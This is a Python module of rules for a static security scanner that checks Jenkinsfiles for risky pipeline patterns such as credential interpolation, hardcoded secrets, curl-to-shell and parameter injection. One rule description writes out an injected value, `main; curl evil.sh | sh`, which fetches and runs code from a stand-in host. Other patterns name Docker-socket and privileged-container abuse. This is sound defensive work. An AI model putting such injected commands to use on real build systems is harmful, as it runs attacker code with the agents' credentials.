"""Jenkinsfile (declarative and scripted pipeline) rules.

Groovy has no Python parser, so these rules use line-level analysis with a small amount of
context tracking (credential variable names, triple-quoted string blocks).
"""
from __future__ import annotations

import re
from typing import Iterator

from ..models import Finding, Severity, SourceFile
from ..registry import finding, rule
from .common import PIPE_TO_SHELL, SECRET_NAME

JENKINS_INTERP = "https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#string-interpolation"
STEP_RE = re.compile(r"\b(sh|bat|powershell|pwsh)\s*\(?\s*(?:script\s*:\s*)?(\"\"\"|\"|''')")
CRED_VAR_RE = re.compile(
    r"\b(?:variable|usernameVariable|passwordVariable|keyFileVariable|passphraseVariable|tokenVariable)"
    r"\s*:\s*['\"](\w+)['\"]")
ENV_CRED_RE = re.compile(r"\b(\w+)\s*=\s*credentials\(")
UNTRUSTED_ENV = r"(?:params\.\w+|env\.(?:BRANCH_NAME|CHANGE_TITLE|CHANGE_BRANCH|CHANGE_AUTHOR\w*|TAG_NAME)|BRANCH_NAME|CHANGE_TITLE|CHANGE_BRANCH)"


def _credential_vars(source: SourceFile) -> set[str]:
    names: set[str] = set()
    for line in source.lines:
        names.update(CRED_VAR_RE.findall(line))
        m = ENV_CRED_RE.search(line)
        if m:  # environment { X = credentials('id') } also defines X_USR and X_PSW
            names.update({m.group(1), m.group(1) + "_USR", m.group(1) + "_PSW"})
    return names


def _interpolated_step_lines(source: SourceFile) -> Iterator[tuple[int, str]]:
    """Yield (line_no, text) for shell-step text that Groovy will interpolate (double-quoted)."""
    in_block = False
    for i, line in enumerate(source.lines, start=1):
        if in_block:
            yield i, line
            if '"""' in line:
                in_block = False
            continue
        m = STEP_RE.search(line)
        if not m:
            continue
        quote = m.group(2)
        rest = line[m.end():]
        if quote == '"""':
            yield i, rest
            in_block = '"""' not in rest
        elif quote == '"':
            yield i, rest


@rule("PG-JNK-001", "Pipeline can run on any agent", Severity.LOW, "jenkins",
      "`agent any` lets the build run on any executor, including the Jenkins controller if it has "
      "executors. Builds on the controller can read its files and secrets.",
      "Use a labelled agent (agent { label 'linux-build' }) or a container agent, and set the controller's executors to 0.",
      ("https://www.jenkins.io/doc/book/security/controller-isolation/",))
def agent_any(source: SourceFile) -> Iterator[Finding]:
    for i, line in enumerate(source.lines, start=1):
        if re.match(r"\s*agent\s+any\b", line):
            yield finding(agent_any, source, i, "`agent any` is used.")


@rule("PG-JNK-002", "Credential interpolated into a shell step", Severity.HIGH, "jenkins",
      "In a double-quoted Groovy string, ${SECRET} is replaced before the shell runs, so the secret can "
      "appear in process listings and logs, and its value is open to shell injection. Jenkins warns about this.",
      "Use single quotes so the shell reads the environment variable itself: sh 'curl -u \"$USER:$PASS\" ...'.",
      (JENKINS_INTERP,))
def credential_interpolation(source: SourceFile) -> Iterator[Finding]:
    creds = _credential_vars(source)
    if not creds:
        return
    pattern = re.compile(r"\$\{?(" + "|".join(sorted(map(re.escape, creds), key=len, reverse=True)) + r")\b")
    for i, text in _interpolated_step_lines(source):
        m = pattern.search(text)
        if m:
            yield finding(credential_interpolation, source, i,
                          f"Credential '{m.group(1)}' is interpolated by Groovy into a shell command.")


@rule("PG-JNK-003", "Hardcoded secret in the pipeline", Severity.CRITICAL, "jenkins",
      "A secret written into the Jenkinsfile is visible to everyone who can read the repository, and stays in Git history.",
      "Store it in the Jenkins credentials store and load it with credentials('id') or withCredentials. "
      "Rotate the exposed value.",
      ("https://www.jenkins.io/doc/book/using/using-credentials/",))
def hardcoded_secret(source: SourceFile) -> Iterator[Finding]:
    assign = re.compile(r"^\s*(?:def\s+|String\s+)?([A-Za-z_]\w*)\s*=\s*(['\"])([^'\"$]{4,})\2")
    for i, line in enumerate(source.lines, start=1):
        m = assign.match(line)
        if m and SECRET_NAME.search(m.group(1)) and not re.search(r"(changeme|example|dummy|xxx+|\*{3,})", m.group(3), re.I):
            yield finding(hardcoded_secret, source, i, f"'{m.group(1)}' is assigned a literal secret value.")


@rule("PG-JNK-004", "Remote script piped to a shell", Severity.MEDIUM, "jenkins",
      "curl ... | sh on a build agent runs whatever the server returns, with the agent's credentials and network access.",
      "Download the script, verify its checksum, then run it, or install a pinned package.")
def jenkins_pipe_to_shell(source: SourceFile) -> Iterator[Finding]:
    for i, line in enumerate(source.lines, start=1):
        if PIPE_TO_SHELL.search(line):
            yield finding(jenkins_pipe_to_shell, source, i, "A downloaded script is piped straight into a shell.")


@rule("PG-JNK-005", "Container agent image not pinned", Severity.MEDIUM, "jenkins",
      "A docker agent without a tag, or with :latest, changes underneath the pipeline and can pull a compromised image.",
      "Pin the image to a version and ideally a digest: image 'maven:3.9.9-eclipse-temurin-21@sha256:<digest>'.")
def jenkins_unpinned_image(source: SourceFile) -> Iterator[Finding]:
    img = re.compile(r"(?:\bimage\s*\(?\s*|docker\.image\(\s*)['\"]([^'\"]+)['\"]")
    for i, line in enumerate(source.lines, start=1):
        for image in img.findall(line):
            if "@sha256:" in image or "$" in image:
                continue
            name = image.rsplit("/", 1)[-1]
            tag = name.split(":", 1)[1] if ":" in name else ""
            if tag in ("", "latest"):
                yield finding(jenkins_unpinned_image, source, i, f"Agent image '{image}' is not pinned to a version.")


@rule("PG-JNK-006", "Privileged container or Docker socket mounted", Severity.HIGH, "jenkins",
      "--privileged or mounting /var/run/docker.sock gives the build root-level control of the agent host, "
      "so any compromised build step can take over the machine and other builds on it.",
      "Drop --privileged and the socket mount. Build images with rootless tools such as BuildKit rootless, Kaniko or Buildah.")
def privileged_agent(source: SourceFile) -> Iterator[Finding]:
    for i, line in enumerate(source.lines, start=1):
        if "--privileged" in line or "/var/run/docker.sock" in line:
            yield finding(privileged_agent, source, i, "The build container is privileged or has the Docker socket mounted.")


@rule("PG-JNK-007", "No pipeline timeout", Severity.LOW, "jenkins",
      "Without a timeout a hung or abused build can hold an agent indefinitely, blocking other builds "
      "(and, for crypto-mining abuse, running up costs).",
      "Add options { timeout(time: 30, unit: 'MINUTES') } or wrap stages in timeout(...).")
def no_timeout(source: SourceFile) -> Iterator[Finding]:
    if source.text.strip() and not re.search(r"\btimeout\s*\(", source.text):
        yield finding(no_timeout, source, source.line_of("pipeline") if "pipeline" in source.text else 1,
                      "The pipeline sets no timeout.")


@rule("PG-JNK-008", "Command injection from build parameters or branch names", Severity.HIGH, "jenkins",
      "Parameters, branch names and pull request titles are controlled by whoever triggers the build. "
      "Interpolated into a double-quoted shell step, a value like `main; curl evil.sh | sh` runs as code.",
      "Pass the value through the environment and quote it in the shell: "
      "withEnv([\"TARGET=${params.TARGET}\"]) { sh 'deploy \"$TARGET\"' }, and validate it against an allow-list.",
      (JENKINS_INTERP,))
def param_injection(source: SourceFile) -> Iterator[Finding]:
    pattern = re.compile(r"\$\{?\s*" + UNTRUSTED_ENV)
    for i, text in _interpolated_step_lines(source):
        m = pattern.search(text)
        if m:
            yield finding(param_injection, source, i, "An untrusted value is interpolated by Groovy into a shell command.")


@rule("PG-JNK-009", "Approval gate open to anyone", Severity.MEDIUM, "jenkins",
      "An input step without `submitter` lets any user with Build permission approve the step, "
      "for example a production deployment.",
      "Restrict approvers: input message: 'Deploy to prod?', submitter: 'release-managers'.")
def input_without_submitter(source: SourceFile) -> Iterator[Finding]:
    lines = source.lines
    for i, line in enumerate(lines, start=1):
        if re.search(r"\binput\s*(\(|\{|message\s*:)", line):
            window = " ".join(lines[i - 1:i + 5])  # submitter is usually within the next few lines
            if "submitter" not in window:
                yield finding(input_without_submitter, source, i, "Manual approval step has no `submitter` restriction.")


@rule("PG-JNK-010", "Dynamic code loading", Severity.MEDIUM, "jenkins",
      "@Grab downloads libraries at run time, and evaluate()/load run Groovy from strings or workspace files, "
      "so code from outside the reviewed Jenkinsfile can run with pipeline privileges.",
      "Use a trusted, versioned shared library (@Library('name@v1.2.0')) instead.")
def dynamic_code(source: SourceFile) -> Iterator[Finding]:
    for i, line in enumerate(source.lines, start=1):
        if re.search(r"@Grab\b|\bevaluate\s*\(|^\s*load\s*\(?\s*['\"]", line):
            yield finding(dynamic_code, source, i, "Pipeline loads or evaluates code dynamically.")
